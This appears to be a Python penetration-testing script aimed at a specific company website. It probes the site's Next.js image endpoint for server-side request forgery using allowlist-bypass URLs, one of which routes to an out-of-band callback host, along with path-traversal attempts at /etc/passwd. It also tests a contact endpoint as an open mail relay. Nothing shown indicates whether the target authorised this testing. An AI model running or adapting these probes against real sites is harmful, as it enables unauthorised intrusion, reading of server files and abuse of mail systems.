import requests, time, json
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
B='https://www.infinitycapital.bh'
s=requests.Session(); s.headers.update({'User-Agent':UA,'Accept':'text/html,*/*'})
H1='oobf1f8b7d91a7d.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in'
import urllib.parse
IMG=B+'/_next/image'
def img(u,w=640,q=75):
    return s.get(IMG+'?'+urllib.parse.urlencode({'url':u,'w':str(w),'q':str(q)}),timeout=40)
print("== redirect chase / allowlist bypass ==", flush=True)
# does images.ctfassets.net allow redirect to arbitrary host?  (we control no path on it, so use a known open-redirect on same allowed host is not possible)
# Instead: test double-encoding, userinfo, subdomain trickery
tricks=[
 "https://images.ctfassets.net@oobf1f8b7d91a7d.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/evil.png",
 "https://images.ctfassets.net.evil.invalid/x.png",
 "//images.ctfassets.net/x.png",
 "https://images.ctfassets.net/../../../../etc/passwd",
 "/_next/image?url=x",
 "https://images.ctfassets.net/%2e%2e%2f%2e%2e%2fetc/passwd",
 "https://cdn.ctfassets.net/x.png",
 "https://videos.ctfassets.net/x.png",
]
for u in tricks:
    try:
        r=img(u); print(f"{r.status_code} len={len(r.content)} :: {u[:70]} :: {r.content[:90]!r}",flush=True)
    except Exception as e: print("ERR",u[:50],e,flush=True)
    time.sleep(1)

print("\n== /api/send open relay re-test ==",flush=True)
r=s.get(B+'/api/send',timeout=25); print("GET",r.status_code,repr(r.content[:100]),flush=True)
payload={"name":"IC Test","email":"probe@invalid.example","subject":"vapt probe","message":"hello","targets":"nonexistentuser99871@invalid.example","phone":"+97300000000"}
t=time.time()
r=s.post(B+'/api/send',json=payload,timeout=40)
print("POST json",r.status_code,repr(r.content[:300]),f"t={time.time()-t:.1f}",flush=True)
for ct,body in [('form',{'name':'IC Test','email':'a@b.example','subject':'x','message':'y'}),
                 ('rawjson',None)]:
    pass
r=s.post(B+'/api/send',data=payload,headers={'Content-Type':'application/x-www-form-urlencoded'},timeout=40)
print("POST form",r.status_code,repr(r.content[:200]),flush=True)
